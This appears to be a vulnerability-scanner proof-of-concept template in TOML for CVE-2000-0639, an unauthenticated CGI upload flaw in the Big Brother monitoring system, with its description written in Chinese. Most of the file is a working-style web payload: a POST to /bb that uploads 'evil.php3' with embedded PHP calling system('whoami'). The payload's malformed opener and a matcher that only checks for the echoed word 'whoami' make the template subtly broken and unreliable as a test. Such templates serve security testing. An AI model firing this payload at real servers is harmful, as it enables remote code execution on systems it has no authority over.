[info]
author = "ave"
description = "该漏洞利用Big Brother 监控系统1.4h2及更早版本的默认配置缺陷，通过bbd组件上传具有可执行扩展名的CGI文件，进而实现远程命令执行。攻击者无需认证即可将恶意脚本上传到服务器并通过web服务器执行。"
id = "POC-AVE-2000-0491"
name = "CVE-2000-0639 Big Brother CGI File Upload Remote Command Execution PoC"
severity = "high"
tags = ["ave-2000-0491"]
vuln_id = [
    "CVE-2000-0639",
    "AVE-2000-0491",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/bb"
protocol = "http"

[poc.requests.body]
content = 'status=evil.php3&cmd=<?<system(\"whoami\");?>'
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["whoami"]
